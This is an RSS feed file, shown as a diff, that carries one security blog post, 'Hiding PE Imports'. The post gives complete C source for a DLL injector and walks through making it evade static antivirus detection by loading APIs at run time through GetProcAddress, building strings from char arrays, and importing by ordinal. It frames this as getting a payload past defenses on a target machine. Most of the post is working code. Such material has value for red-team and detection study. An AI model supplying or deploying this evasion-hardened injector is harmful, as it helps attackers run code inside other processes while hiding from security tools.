@@ -1,0 +1,319 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Robleh Esa</title>
+        <link>https://roblehesa.com/posts/</link>
+        <description>Recent content in Posts on Robleh Esa</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc-sa/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC-SA 4.0&lt;/a&gt;</copyright>
+        <lastBuildDate>Wed, 12 Aug 2020 17:58:14 -0500</lastBuildDate>
+        <atom:link href="https://roblehesa.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Hiding PE Imports</title>
+            <link>https://roblehesa.com/posts/hiding-pe-imports/</link>
+            <pubDate>Wed, 12 Aug 2020 17:58:14 -0500</pubDate>
+            
+            <guid>https://roblehesa.com/posts/hiding-pe-imports/</guid>
+            <description>You&amp;rsquo;ve spent the last hour cheffing up a spicy, homemade, Windows executable just right for your target. Go to compile it and, sweet, there are no errors. Fire up the isolated VM and give it a few test runs and it&amp;rsquo;s working great. That ASCII art is looking mighty clean I must say. Time to send it downrange. Upload completes and you can see it on the file system.
+PS C:\Users\ksoze&amp;gt; .</description>
+            <content type="html"><![CDATA[<p>You&rsquo;ve spent the last hour cheffing up a spicy, homemade, Windows executable just right for your target. Go to compile it and, <em>sweet</em>, there are no errors. Fire up the isolated VM and give it a few test runs and it&rsquo;s working great. That ASCII art is looking mighty clean I must say. Time to send it downrange. Upload completes and you can see it on the file system.</p>
+<p><img src="assets/button.gif" alt="Bombs away!"></p>
+<pre><code class="language-powershell">PS C:\Users\ksoze&gt; ./beastmode.exe
+./beastmode.exe : The term './beastmode.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ ./beastmode.exe
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (./beastmode.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+</code></pre>
+<p>Wait what? It was just&hellip; deleted. &ldquo;But it&rsquo;s custom, no vendor has ever seen this file hash&rdquo;, you tell yourself. Was it sandboxed and analyzed that quickly? Nah, it&rsquo;s got to be something static.</p>
+<p>The executable&rsquo;s Import Address Table may be giving away its intentions before it&rsquo;s run.</p>
+<h2 id="import-address-table">Import Address Table</h2>
+<p>PE files use their Import Address Table to reference functions imported from DLLs. When the PE is executed, the Windows loader maps everything into memory and fills the IAT with the appropriate addresses. Let&rsquo;s take a look at the source code of a sample program and see how it can be improved.</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+int wmain(int argc, PWSTR* argv) {
+	HANDLE process = OpenProcess(
+		PROCESS_ALL_ACCESS,
+		FALSE,
+		_wtoi(argv[1])
+	);
+	PVOID remoteBuffer = VirtualAllocEx(
+		process,
+		NULL,
+		(wcslen(argv[2]) + 1) * sizeof(WCHAR),
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE
+	);
+	WriteProcessMemory(
+		process,
+		remoteBuffer,
+		argv[2],
+		(wcslen(argv[2]) + 1) * sizeof(WCHAR),
+		NULL
+	);
+	PVOID pLoadLibraryW = GetProcAddress(
+		GetModuleHandleW(L&quot;kernel32.dll&quot;),
+		&quot;LoadLibraryW&quot;
+	);
+	CreateRemoteThread(
+		process,
+		NULL,
+		0,
+		(LPTHREAD_START_ROUTINE)pLoadLibraryW,
+		remoteBuffer,
+		0,
+		NULL
+	);
+	return 0;
+}
+</code></pre>
+<p><code>injector.c</code> is a bare-bones DLL injector that:</p>
+<ul>
+<li>Gets a process handle using <code>OpenProcess</code></li>
+<li>Uses <code>VirtualAllocEx</code> to create a writable buffer in the remote process</li>
+<li>Writes the absolute path of a DLL into the remote buffer with <code>WriteProcessMemory</code></li>
+<li>Combines <code>GetModuleHandleW</code> and <code>GetProcAddress</code> to get a pointer to <code>LoadLibraryW</code></li>
+<li>Uses <code>CreateRemoteThread</code> to remotely call <code>LoadLibraryW</code> with the DLL path as an argument</li>
+</ul>
+<p>All in all, that&rsquo;s 7 Windows API functions being referenced from <code>kernel32.dll</code>. Here&rsquo;s the compiled program&rsquo;s IAT viewed in <a href="https://github.com/hasherezade/pe-bear-releases/">PE Bear</a>.</p>
+<p><img src="assets/iat.png" alt="injector.exe&rsquo;s IAT"></p>
+<p>Suspicious combinations of IAT entries can be enough for static analysis to flag a custom PE. In our case, those four at the bottom are a good indicator <code>injector.exe</code> can tamper with other processes. However, you may have noticed <code>LoadLibraryW</code> isn&rsquo;t present in the IAT. That&rsquo;s because <code>GetProcAddress</code> is used to <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking">link it in at run-time instead of load-time</a>.</p>
+<h2 id="run-time-dynamic-linking-with-getprocaddress">Run-Time Dynamic Linking with GetProcAddress</h2>
+<p>What if we use <code>GetProcAddress</code> for all of our suspicious Windows API function imports? The only hurdle is that <code>GetProcAddress</code> returns generic function pointers (FARPROCs) which can be messy. We can <a href="https://docs.microsoft.com/en-us/cpp/build/getprocaddress?view=vs-2019">use typedefs to provide a little type safety</a> and simplify the calling syntax. You can find the function signatures you need from local header files or <a href="https://docs.microsoft.com/en-us/windows/win32/api/">MSDN</a>.</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+//////////////////////////////////////////////////////////////////////////////
+// typedef the function signature of each dynamic import
+//
+// OpenProcess
+typedef HANDLE (WINAPI* op) (
+    DWORD dwDesiredAccess,
+    BOOL  bInheritHandle,
+    DWORD dwProcessId
+);
+// VirtualAllocEx
+typedef LPVOID (WINAPI* vaex) (
+    HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+// WriteProcessMemory
+typedef BOOL (WINAPI* wpm) (
+    HANDLE  hProcess,
+    LPVOID  lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T  nSize,
+    SIZE_T* lpNumberOfBytesWritten
+);
+// CreateRemoteThread
+typedef HANDLE (WINAPI* crt) (
+    HANDLE                 hProcess,
+    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+    SIZE_T                 dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID                 lpParameter,
+    DWORD                  dwCreationFlags,
+    LPDWORD                lpThreadId
+);
+//////////////////////////////////////////////////////////////////////////////
+
+int wmain(int argc, PWSTR* argv) {
+    HMODULE kernel32 = GetModuleHandleW(L&quot;kernel32.dll&quot;);
+
+    // Initialize your imported function as one of the types declared above
+    op pOpenProcess = GetProcAddress(kernel32, &quot;OpenProcess&quot;);
+    HANDLE process = pOpenProcess(
+        PROCESS_ALL_ACCESS,
+        FALSE,
+        _wtoi(argv[1])
+    );
+    vaex pVirtualAllocEx = GetProcAddress(kernel32, &quot;VirtualAllocEx&quot;);
+    PVOID remoteBuffer = pVirtualAllocEx(
+        process,
+        NULL,
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    wpm pWriteProcessMemory = GetProcAddress(kernel32, &quot;WriteProcessMemory&quot;);
+    pWriteProcessMemory(
+        process,
+        remoteBuffer,
+        argv[2],
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        NULL
+    );
+    PVOID pLoadLibraryW = GetProcAddress(
+        GetModuleHandleW(L&quot;kernel32.dll&quot;),
+        &quot;LoadLibraryW&quot;
+    );
+    crt pCreateRemoteThread = GetProcAddress(kernel32, &quot;CreateRemoteThread&quot;);
+    pCreateRemoteThread(
+        process,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
+        remoteBuffer,
+        0,
+        NULL
+    );
+    return 0;
+}
+</code></pre>
+<p>With some modifications, all of the functions we need from <code>kernel32.dll</code>, except <code>GetProcAddress</code> and <code>GetModuleHandleW</code>, are loaded dynamically. Let&rsquo;s compile it and see what the IAT looks like.</p>
+<p><img src="assets/stealthier-iat.png" alt="Stealthier IAT"></p>
+<p>Would you look at that? <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> are no longer present. However, now the string parameters for <code>GetProcAddress</code> are embedded in the binary.</p>
+<p><img src="assets/strings.png" alt="String dump of injector.exe"></p>
+<p>The next step is typically to encrypt or obfuscate the strings until they are passed to <code>GetProcAddress</code>. <a href="https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/">One trick I&rsquo;ve seen</a> is to use null-terminated arrays of <code>chars</code> instead of strings. This generates assembly instructions that build strings dynamically instead of embedding them intact.</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+// snip...
+
+char kernel32Str[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0};
+char openProcessStr[] = {'o', 'p', 'e', 'n', 'p', 'r', 'o', 'c', 'e', 's', 's', 0};
+char virtualAllocExStr[] = {'v', 'i', 'r', 't', 'u', 'a', 'l', 'a', 'l', 'l', 'o', 'c', 'e', 'x', 0};
+
+// snip...
+
+int wmain(int argc, PWSTR* argv) {
+    HMODULE kernel32 = GetModuleHandleW(kernel32Str);
+
+    op pOpenProcess = GetProcAddress(kernel32, openProcessStr);
+    HANDLE process = pOpenProcess(
+        PROCESS_ALL_ACCESS,
+        FALSE,
+        _wtoi(argv[1])
+    );
+    vaex pVirtualAllocEx = GetProcAddress(kernel32, virtualAllocExStr);
+    PVOID remoteBuffer = pVirtualAllocEx(
+        process,
+        NULL,
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+// snip...
+</code></pre>
+<p>Our injector is now much more resilient to static analysis techniques. This should be enough to evade detections based on the presence of function names.</p>
+<h2 id="bonus-import-by-ordinal">Bonus: Import by Ordinal</h2>
+<p>With the assistance of a debugger, examining what strings are passed into <code>GetProcAddress</code> is simple. An analyst could set a breakpoint in <code>kernel32.dll</code> on <code>GetProcAddress</code> and examine register states during each call.</p>
+<p><img src="assets/breakpoint.png" alt="Breakpoint on GetProcAddress"></p>
+<p>This would reveal the name of each function being loaded dynamically. Here&rsquo;s an example of what retrieving the address of <code>OpenProcess</code> would look like.</p>
+<p><img src="assets/openprocess.png" alt="GetProcAddress of OpenProcess break"></p>
+<p>However, <code>GetProcAddress</code> doesn&rsquo;t need a function&rsquo;s name. <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">According to MSDN,</a> it can also look it up by its ordinal:</p>
+<blockquote>
+<p>Parameters</p>
+<p>hModule</p>
+<p>A handle to the DLL module that contains the function or variable. The LoadLibrary, LoadLibraryEx, LoadPackagedLibrary, or GetModuleHandle function returns this handle.</p>
+<p>The GetProcAddress function does not retrieve addresses from modules that were loaded using the LOAD_LIBRARY_AS_DATAFILE flag. For more information, see LoadLibraryEx.</p>
+<p>lpProcName</p>
+<p>The function or variable name, or the function&rsquo;s ordinal value. If this parameter is an ordinal value, it must be in the low-order word; the high-order word must be zero.</p>
+</blockquote>
+<p>An ordinal is the ID number of a function exported by a DLL. We can find the ordinal numbers we need in most PE viewers, I like <a href="https://github.com/hasherezade/pe-bear-releases/">PE Bear</a>. Simply load up <code>kernel32.dll</code>, browse its exports for the function you need, and note its ordinal.</p>
+<p><img src="assets/ordinal.png" alt="PE Bear find ordinal"></p>
+<p>Here&rsquo;s what the final version of <code>injector.c</code> looks like:</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+// OpenProcess
+typedef HANDLE (WINAPI* op) (
+    DWORD dwDesiredAccess,
+    BOOL  bInheritHandle,
+    DWORD dwProcessId
+);
+// VirtualAllocEx
+typedef LPVOID (WINAPI* vaex) (
+    HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+// WriteProcessMemory
+typedef BOOL (WINAPI* wpm) (
+    HANDLE  hProcess,
+    LPVOID  lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T  nSize,
+    SIZE_T* lpNumberOfBytesWritten
+);
+// CreateRemoteThread
+typedef HANDLE (WINAPI* crt) (
+    HANDLE                 hProcess,
+    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+    SIZE_T                 dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID                 lpParameter,
+    DWORD                  dwCreationFlags,
+    LPDWORD                lpThreadId
+);
+
+int wmain(int argc, PWSTR* argv) {
+    HMODULE kernel32 = GetModuleHandleW(L&quot;kernel32.dll&quot;);
+
+    // Note the hex value instead of a string
+    op pOpenProcess = GetProcAddress(kernel32, 0x411);
+    HANDLE process = pOpenProcess(
+        PROCESS_ALL_ACCESS,
+        FALSE,
+        _wtoi(argv[1])
+    );
+    vaex pVirtualAllocEx = GetProcAddress(kernel32, 0x5D7);
+    PVOID remoteBuffer = pVirtualAllocEx(
+        process,
+        NULL,
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    wpm pWriteProcessMemory = GetProcAddress(kernel32, 0x62B);
+    pWriteProcessMemory(
+        process,
+        remoteBuffer,
+        argv[2],
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        NULL
+    );
+    PVOID pLoadLibraryW = GetProcAddress(
+        GetModuleHandleW(L&quot;kernel32.dll&quot;),
+        &quot;LoadLibraryW&quot;
+    );
+    crt pCreateRemoteThread = GetProcAddress(kernel32, 0xE8);
+    pCreateRemoteThread(
+        process,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
+        remoteBuffer,
+        0,
+        NULL
+    );
+    return 0;
+}
+</code></pre>
+<p>Within <a href="https://x64dbg.com/#start">x64dbg</a> if we once again break on <code>GetProcAddress</code>, we will no longer see that obvious function name. The <code>RDX</code> register now contains our function&rsquo;s ordinal, 0x411.</p>
+<p><img src="assets/ordinalbreakpoint.png" alt="Break on GetProcAddress ordinal"></p>
+<p>An analyst would now have to take a few extra steps to find out what function our program is importing. They could trace the ordinal number back to its function name. Or, they could step through the debugger until <code>GetProcAddress</code> returns (CTRL+F9 in <a href="https://x64dbg.com/#start">x64dbg</a>) and examine the return value. The latter is simple since <code>kernel32.dll</code> has debug symbols.</p>
+<p><img src="assets/ordinalreturn.png" alt="GetProcAddress return value"></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=rbN53Xh21_g">Open Security: Life of Binaries</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking">Microsoft: Run-Time Dynamic Linking</a></li>
+<li><a href="https://devblogs.microsoft.com/oldnewthing/20141210-00/?p=43433">Raymond Chen</a></li>
+</ul>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
